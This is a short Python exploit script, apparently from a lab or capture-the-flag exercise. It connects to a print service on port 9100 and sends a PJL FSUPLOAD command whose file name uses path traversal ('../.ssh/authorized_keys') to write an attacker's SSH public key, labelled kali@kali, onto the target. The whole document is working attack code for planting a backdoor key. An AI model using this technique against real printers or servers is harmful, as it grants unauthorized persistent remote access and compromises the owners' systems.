#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
n = len(KEY)
path = "../.ssh/authorized_keys"

hdr = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={n}\r\n'.encode()
s = socket.socket()
s.settimeout(5)
s.connect(("127.0.0.1", 9100))
s.sendall(hdr + KEY)
try:
    print(s.recv(4096))
except socket.timeout:
    print("OK_TIMEOUT")
s.close()